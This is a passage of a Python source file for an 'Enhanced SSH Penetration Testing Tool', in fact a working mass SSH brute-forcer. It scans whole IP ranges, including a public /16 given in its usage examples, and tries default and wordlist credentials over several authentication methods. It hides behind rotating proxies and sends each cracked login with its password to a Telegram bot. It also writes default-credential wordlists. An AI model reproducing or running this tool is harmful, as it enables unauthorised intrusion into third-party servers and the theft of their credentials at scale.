        Args:
            host: Target host
            port: SSH port
            usernames: List of usernames to try
            passwords: List of passwords to try
            key_files: List of private key files to try
            
        Returns:
            List of successful login dictionaries
        """
        results = []
        
        # Detect available authentication methods
        self.logger.info(f"Detecting authentication methods for {host}:{port}")
        auth_methods = SSHAuthDetector.detect_auth_methods(host, port)
        self.logger.info(f"Available methods: {', '.join(auth_methods)}")
        
        # Try none authentication first
        if SSHAuthMethod.NONE in auth_methods:
            self.logger.debug(f"Trying none authentication for {host}:{port}")
            for username in usernames or ['root', 'admin']:
                result = self.ssh_client.attempt_none_auth(host, port, username)
                if result:
                    results.append(result)
                    self.logger.success(f"None auth successful: {username}@{host}:{port}")
                    
                    # Send Telegram notification if configured
                    if self.telegram_notifier and self.telegram_chat_id:
                        try:
                            self.telegram_notifier.send_ssh_success_notification(
                                self.telegram_chat_id, 
                                result,
                                batch_info=getattr(self, '_current_batch_info', '')
                            )
                        except Exception as e:
                            self.logger.error(f"Failed to send Telegram notification: {e}")
        
        # Try password authentication
        if SSHAuthMethod.PASSWORD in auth_methods:
            self.logger.debug(f"Trying password authentication for {host}:{port}")
            
            # Use provided credentials or defaults
            if not usernames:
                credentials = CredentialManager.get_default_credentials()
            else:
                credentials = []
                for username in usernames:
                    for password in (passwords or ['', 'password', '123456', username]):
                        credentials.append((username, password))
            
            for username, password in credentials:
                result = self.ssh_client.attempt_password_auth(host, port, username, password)
                if result:
                    results.append(result)
                    self.logger.success(f"Password auth successful: {username}:{password}@{host}:{port}")
                    
                    # Send Telegram notification if configured
                    if self.telegram_notifier and self.telegram_chat_id:
                        try:
                            self.telegram_notifier.send_ssh_success_notification(
                                self.telegram_chat_id, 
                                result,
                                batch_info=getattr(self, '_current_batch_info', '')
                            )
                        except Exception as e:
                            self.logger.error(f"Failed to send Telegram notification: {e}")
                    
                    break  # Stop after first successful login per user
                
                # Add delay to avoid triggering rate limits
                time.sleep(CONFIG['delay_between_attempts'])
        
        # Try public key authentication
        if SSHAuthMethod.PUBLICKEY in auth_methods and key_files:
            self.logger.debug(f"Trying public key authentication for {host}:{port}")
            
            for username in usernames or ['root', 'admin']:
                for key_file in key_files:
                    if os.path.exists(key_file):
                        result = self.ssh_client.attempt_key_auth(host, port, username, key_file)
                        if result:
                            results.append(result)
                            self.logger.success(f"Key auth successful: {username}@{host}:{port} (key: {key_file})")
                            
                            # Send Telegram notification if configured
                            if self.telegram_notifier and self.telegram_chat_id:
                                try:
                                    self.telegram_notifier.send_ssh_success_notification(
                                        self.telegram_chat_id, 
                                        result,
                                        batch_info=getattr(self, '_current_batch_info', '')
                                    )
                                except Exception as e:
                                    self.logger.error(f"Failed to send Telegram notification: {e}")
                            
                            break
        
        # Try keyboard-interactive authentication
        if SSHAuthMethod.KEYBOARD_INTERACTIVE in auth_methods:
            self.logger.debug(f"Trying interactive authentication for {host}:{port}")
            
            for username in usernames or ['root', 'admin']:
                # Try common responses for interactive prompts
                for responses in [['password'], ['123456'], [username], ['admin'], ['']]:
                    result = self.ssh_client.attempt_interactive_auth(host, port, username, responses)
                    if result:
                        results.append(result)
                        self.logger.success(f"Interactive auth successful: {username}@{host}:{port}")
                        
                        # Send Telegram notification if configured
                        if self.telegram_notifier and self.telegram_chat_id:
                            try:
                                self.telegram_notifier.send_ssh_success_notification(
                                    self.telegram_chat_id, 
                                    result,
                                    batch_info=getattr(self, '_current_batch_info', '')
                                )
                            except Exception as e:
                                self.logger.error(f"Failed to send Telegram notification: {e}")
                        
                        break
        
        return results
    
    def test_targets_from_file(self, file_path: str, **kwargs) -> List[Dict]:
        """Test targets from a file"""
        results = []
        
        try:
            with open(file_path, 'r') as f:
                targets = []
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    if ':' in line:
                        host, port = line.split(':', 1)
                        targets.append((host.strip(), int(port.strip())))
                    else:
                        targets.append((line.strip(), 22))
            
            self.logger.info(f"Testing {len(targets)} targets from {file_path}")
            
            with ThreadPoolExecutor(max_workers=CONFIG['max_threads']) as executor:
                future_to_target = {
                    executor.submit(self.test_target, host, port, **kwargs): (host, port)
                    for host, port in targets
                }
                
                for future in as_completed(future_to_target):
                    host, port = future_to_target[future]
                    try:
                        target_results = future.result()
                        results.extend(target_results)
                    except Exception as e:
                        self.logger.error(f"Error testing {host}:{port} - {str(e)}")
        
        except Exception as e:
            self.logger.error(f"Failed to read targets file {file_path}: {e}")
        
        return results
    
    def auto_scan_and_test(self, ip_range: str, ports: Optional[List[int]] = None, batch_size: int = 1000, **kwargs) -> List[Dict]:
        """
        Automatically scan an IP range for SSH services and test them in batches
        
        Args:
            ip_range: IP range to scan (CIDR or range format)
            ports: List of SSH ports to scan (default [22])
            batch_size: Number of IPs to process per batch
            **kwargs: Additional arguments for testing (usernames, passwords, etc.)
            
        Returns:
            List of successful login dictionaries
        """
        results = []
        
        # Generate IP list
        self.logger.info(f"Starting auto-scan of IP range: {ip_range}")
        ips = self.scanner.generate_ip_range(ip_range)
        
        if not ips:
            self.logger.error("No valid IP addresses generated from range")
            return results
        
        # Process IPs in batches
        self.logger.info(f"Processing {len(ips)} IPs in batches of {batch_size}")
        
        for batch_start in range(0, len(ips), batch_size):
            batch_end = min(batch_start + batch_size, len(ips))
            batch_ips = ips[batch_start:batch_end]
            batch_num = (batch_start // batch_size) + 1
            total_batches = (len(ips) + batch_size - 1) // batch_size
            
            # Set batch info for Telegram notifications
            self._current_batch_info = f"(Batch {batch_num}/{total_batches})"
            
            self.logger.info(f"Processing batch {batch_num}/{total_batches}: {len(batch_ips)} IPs")
            
            # Show current proxy status if using proxies
            if self.proxy_manager:
                proxy_status = self.proxy_manager.get_current_proxy_status()
                if proxy_status['current_proxy']:
                    self.logger.info(f"🔒 Current proxy: {proxy_status['current_proxy']} ({proxy_status['total_working']} working, {proxy_status['total_failed']} failed)")
                else:
                    self.logger.warning("🔒 No working proxy available")
            
            # Scan for SSH services in this batch
            self.logger.info(f"Scanning batch {batch_num} across {len(ports or [22])} ports for SSH services...")
            batch_targets = []
            
            for port in (ports or [22]):
                open_hosts = self.scanner.fast_scan_hosts(batch_ips, port)
                batch_targets.extend(open_hosts)
            
            if not batch_targets:
                self.logger.info(f"No SSH services found in batch {batch_num}")
                continue
            
            self.logger.success(f"Found {len(batch_targets)} SSH services in batch {batch_num}")
            
            # Test each target for SSH access in this batch
            batch_results = []
            self.logger.info(f"Testing SSH access on {len(batch_targets)} targets in batch {batch_num}...")
            
            with ThreadPoolExecutor(max_workers=CONFIG['max_threads']) as executor:
                future_to_service = {
                    executor.submit(self.test_target, host, port, **kwargs): (host, port)
                    for host, port in batch_targets
                }
                
                completed = 0
                for future in as_completed(future_to_service):
                    host, port = future_to_service[future]
                    completed += 1
                    
                    # Show progress
                    if completed % 5 == 0 or completed == len(batch_targets):
                        self.logger.info(f"Batch {batch_num}: Tested {completed}/{len(batch_targets)} SSH services...")
                    
                    try:
                        service_results = future.result()
                        if service_results:
                            batch_results.extend(service_results)
                            results.extend(service_results)
                            self.logger.success(f"Found {len(service_results)} successful logins on {host}:{port}")
                    except Exception as e:
                        self.logger.error(f"Error testing {host}:{port} - {str(e)}")
            
            if batch_results:
                self.logger.success(f"Batch {batch_num} completed: {len(batch_results)} successful logins found")
            else:
                self.logger.info(f"Batch {batch_num} completed: No successful logins")
        
        # Clear batch info
        self._current_batch_info = ""
        
        return results
    
    def save_results(self, results: List[Dict], output_file: str):
        """Save results to JSON file"""
        try:
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2, default=str)
            self.logger.success(f"Results saved to {output_file}")
        except Exception as e:
            self.logger.error(f"Failed to save results: {e}")

def create_sample_files():
    """Create sample credential files"""
    
    # Create sample usernames file
    usernames = [
        'root', 'admin', 'administrator', 'user', 'guest',
        'ubuntu', 'centos', 'debian', 'oracle', 'postgres',
        'mysql', 'nginx', 'apache', 'www-data', 'ftpuser'
    ]
    
    with open('usernames.txt', 'w') as f:
        f.write('\n'.join(usernames))
    
    # Create sample passwords file
    passwords = [
        'password', '123456', 'admin', 'root', 'qwerty',
        '12345678', '123456789', 'password123', 'admin123',
        'changeme', 'welcome', 'letmein', 'monkey', 'dragon'
    ]
    
    with open('passwords.txt', 'w') as f:
        f.write('\n'.join(passwords))
    
    # Create sample combinations file
    combinations = [
        'root:root', 'admin:admin', 'administrator:administrator',
        'admin:password', 'root:password', 'admin:123456',
        'root:123456', 'guest:guest', 'user:user', 'test:test'
    ]
    
    with open('combinations.txt', 'w') as f:
        f.write('\n'.join(combinations))
    
    # Create sample targets file
    with open('targets.txt', 'w') as f:
        f.write("# Sample targets file\n")
        f.write("# Format: host or host:port\n")
        f.write("127.0.0.1:22\n")
        f.write("localhost\n")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="Enhanced SSH Penetration Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test single target with default credentials
  python ssh_tool.py -t 192.168.1.100
  
  # Test target with custom username/password lists
  python ssh_tool.py -t 192.168.1.100 -u usernames.txt -p passwords.txt
  
  # Test multiple targets from file
  python ssh_tool.py -T targets.txt -c combinations.txt
  
  # Auto-scan IP range for SSH services (CIDR format)
  python ssh_tool.py -r 217.17.0.0/16 -c combinations.txt -v
  
  # Auto-scan IP range (range format) with multiple ports
  python ssh_tool.py -r 217.17.0.0-217.17.255.255 --ports 22 2222 2022 -v
  
  # Use proxies for all connections (scanning and authentication)
  python ssh_tool.py -r 217.17.0.0/16 --use-proxies -c combinations.txt -v
  
  # Use proxies with custom proxy sources
  python ssh_tool.py -t 192.168.1.100 --use-proxies --proxy-sources http://example.com/proxies.txt -v
  
  # Auto-scan with batch processing and Telegram notifications
  python ssh_tool.py -r 217.17.0.0/16 --batch-size 500 --telegram-token YOUR_BOT_TOKEN --telegram-chat YOUR_CHAT_ID -v
  
  # Batch scanning with proxy protection and notifications
  python ssh_tool.py -r 217.17.0.0/24 --use-proxies --batch-size 1000 --telegram-token YOUR_BOT_TOKEN --telegram-chat YOUR_CHAT_ID
  
  # Test with SSH keys
  python ssh_tool.py -t 192.168.1.100 -k ~/.ssh/id_rsa -u usernames.txt
  
  # Generate sample files
  python ssh_tool.py --create-samples
        """
    )
    
    # Target options
    target_group = parser.add_mutually_exclusive_group()
    target_group.add_argument('-t', '--target', help='Single target (host:port or host)')
    target_group.add_argument('-T', '--targets-file', help='File containing targets')
    target_group.add_argument('-r', '--range', help='IP range to auto-scan (CIDR: 217.17.0.0/16 or range: 217.17.0.0-217.17.255.255)')
    
    # Scanning options
    parser.add_argument('--ports', nargs='*', type=int, default=[22], help='SSH ports to scan (default: 22)')
    parser.add_argument('--scan-threads', type=int, default=100, help='Max threads for port scanning')
    
    # Proxy options
    parser.add_argument('--use-proxies', action='store_true', help='Enable proxy usage for all connections')
    parser.add_argument('--proxy-sources', nargs='*', help='Custom proxy source URLs')
    parser.add_argument('--proxy-timeout', type=int, default=10, help='Proxy test timeout (seconds)')
    
    # Telegram notification options
    parser.add_argument('--telegram-token', help='Telegram bot token for notifications')
    parser.add_argument('--telegram-chat', help='Telegram chat ID for notifications')
    
    # Batch processing options
    parser.add_argument('--batch-size', type=int, default=1000, help='Number of IPs to process per batch (default: 1000)')
    
    # Credential options
    parser.add_argument('-u', '--usernames', help='Username list file or single username')
    parser.add_argument('-p', '--passwords', help='Password list file or single password')
    parser.add_argument('-c', '--combinations', help='Username:password combinations file')
    parser.add_argument('-k', '--keys', nargs='*', help='SSH private key files')
    
    # Configuration options
    parser.add_argument('--threads', type=int, default=50, help='Max concurrent threads')
    parser.add_argument('--timeout', type=int, default=10, help='Connection timeout (seconds)')
    parser.add_argument('--auth-timeout', type=int, default=5, help='Authentication timeout (seconds)')
    parser.add_argument('--delay', type=float, default=1.0, help='Delay between attempts (seconds)')
    
    # Output options
    parser.add_argument('-o', '--output', default='results.json', help='Output file for results')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--log-file', help='Log file path')
    
    # Utility options
    parser.add_argument('--create-samples', action='store_true', help='Create sample credential files')
    
    args = parser.parse_args()
    
    if args.create_samples:
        create_sample_files()
        print("Sample files created: usernames.txt, passwords.txt, combinations.txt, targets.txt")
        return
    
    if not args.target and not args.targets_file and not args.range:
        parser.error("Must specify either -t/--target, -T/--targets-file, or -r/--range")
    
    # Update configuration
    CONFIG['max_threads'] = args.threads
    CONFIG['timeout'] = args.timeout
    CONFIG['auth_timeout'] = args.auth_timeout
    CONFIG['delay_between_attempts'] = args.delay
    CONFIG['verbose'] = args.verbose
    CONFIG['output_file'] = args.output
    if args.log_file:
        CONFIG['log_file'] = args.log_file
    
    # Initialize logger
    logger = Logger(verbose=args.verbose, log_file=CONFIG.get('log_file'))
    
    # Initialize tester
    tester = SSHPenetrationTester(
        logger, 
        use_proxies=args.use_proxies,
        telegram_token=args.telegram_token,
        telegram_chat_id=args.telegram_chat
    )
    
    # Configure proxy manager if enabled
    if args.use_proxies and tester.proxy_manager:
        if args.proxy_sources:
            tester.proxy_manager.proxy_sources = args.proxy_sources
            logger.info(f"Using custom proxy sources: {len(args.proxy_sources)} URLs")
        
        if args.proxy_timeout:
            tester.proxy_manager.max_proxy_test_time = args.proxy_timeout
    
    logger.info(f"Enhanced SSH Penetration Testing Tool v{__version__}")
    logger.info("=" * 50)
    
    # Load credentials
    usernames = None
    passwords = None
    
    if args.usernames:
        if os.path.isfile(args.usernames):
            usernames = CredentialManager.load_usernames(args.usernames)
            logger.info(f"Loaded {len(usernames)} usernames from {args.usernames}")
        else:
            usernames = [args.usernames]
    
    if args.passwords:
        if os.path.isfile(args.passwords):
            passwords = CredentialManager.load_passwords(args.passwords)
            logger.info(f"Loaded {len(passwords)} passwords from {args.passwords}")
        else:
            passwords = [args.passwords]
    
    if args.combinations:
        combinations = CredentialManager.load_combinations(args.combinations)
        logger.info(f"Loaded {len(combinations)} combinations from {args.combinations}")
        # Convert combinations to separate lists
        usernames = [combo[0] for combo in combinations]
        passwords = [combo[1] for combo in combinations]
    
    # Test targets
    results = []
    
    if args.target:
        # Single target
        if ':' in args.target:
            host, port = args.target.split(':', 1)
            port = int(port)
        else:
            host = args.target
            port = 22
        
        logger.info(f"Testing single target: {host}:{port}")
        target_results = tester.test_target(host, port, usernames or [], passwords or [], args.keys or [])
        results.extend(target_results)
    
    elif args.targets_file:
        # Multiple targets from file
        target_results = tester.test_targets_from_file(
            args.targets_file,
            usernames=usernames,
            passwords=passwords,
            key_files=args.keys
        )
        results.extend(target_results)
    
    elif args.range:
        # Auto-scan IP range for SSH services
        logger.info(f"Auto-scanning IP range: {args.range}")
        if len(args.ports) > 1:
            logger.info(f"Scanning ports: {', '.join(map(str, args.ports))}")
        
        range_results = tester.auto_scan_and_test(
            args.range,
            ports=args.ports,
            batch_size=args.batch_size,
            usernames=usernames,
            passwords=passwords,
            key_files=args.keys
        )
        results.extend(range_results)
    
    # Display and save results
    logger.info("=" * 50)
    logger.info(f"Testing completed. Found {len(results)} successful logins.")
    
    if results:
        logger.success("Successful logins:")
        for result in results:
            auth_info = f"{result['auth_method']}"
            if result['auth_method'] == SSHAuthMethod.PASSWORD:
                auth_info += f" ({result['username']}:{result['password']})"
            elif result['auth_method'] == SSHAuthMethod.PUBLICKEY:
                auth_info += f" ({result['username']} + key)"
            elif result['auth_method'] == SSHAuthMethod.NONE:
                auth_info += f" ({result['username']} no password)"
            
            logger.success(f"  {result['host']}:{result['port']} - {auth_info}")
        
        # Save results
        tester.save_results(results, args.output)
    
    logger.info("Tool completed.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!]{Colors.RESET} Tool interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[-]{Colors.RESET} Fatal error: {e}")
        sys.exit(1)